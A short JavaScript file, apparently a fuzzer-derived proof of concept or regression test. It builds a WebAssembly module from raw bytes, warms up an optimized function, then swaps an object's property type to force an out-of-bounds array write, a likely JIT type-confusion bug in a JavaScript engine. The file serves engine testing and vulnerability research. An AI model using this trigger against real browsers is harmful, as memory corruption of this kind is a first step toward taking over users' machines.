const v65 = new Uint8Array([0,97,115,109,1,0,0,0,1,8,2,96,0,1,113,96,0,1,127,2,13,1,3,101,110,118,1,102,0,0,3,2,1,1,13,4,1,1,113,7,8,1,4,109,97,105,110,0,1,10,12,1,10,0,4,127,16,0,13,0,0,11,11]);
var wasm_code = v65;
var promise_resolver;
function suspender() {
    const v71 = (a72) => {
        promise_resolver = a72;
    };
    let v73;
    try { v73 = new Promise(v71); } catch (e) {}
    return v73;
}
const v75 = WebAssembly.Instance;
const v76 = WebAssembly.Module;
let v77;
try { v77 = new v76(wasm_code); } catch (e) {}
const v78 = { f: suspender };
const v79 = { env: v78 };
let v80;
try { v80 = new v75(v77, v79); } catch (e) {}
var wasm_instance = v80;
var wasm_main = wasm_instance?.exports?.main;
var victim_obj = { prop: 1 };
var target_array = [1.1,2.2];
function opt_func(a93) {
    try { wasm_main(); } catch (e) {}
    var v = victim_obj.prop;
    if (!a93) {
        target_array[v] = 3.3;
    }
}
class C99 {
    constructor() {
        victim_obj.prop = victim_obj;
    }
}
const v104 = new Proxy(C99, {});
var proxy = v104;
for (let i107 = 0; i107 < 200; i107++) {
    victim_obj.prop = victim_obj;
    opt_func(true);
    try { promise_resolver(); } catch (e) {}
}
victim_obj.prop = victim_obj;
opt_func(false);
Reflect.construct(proxy, []);
try { promise_resolver(); } catch (e) {}
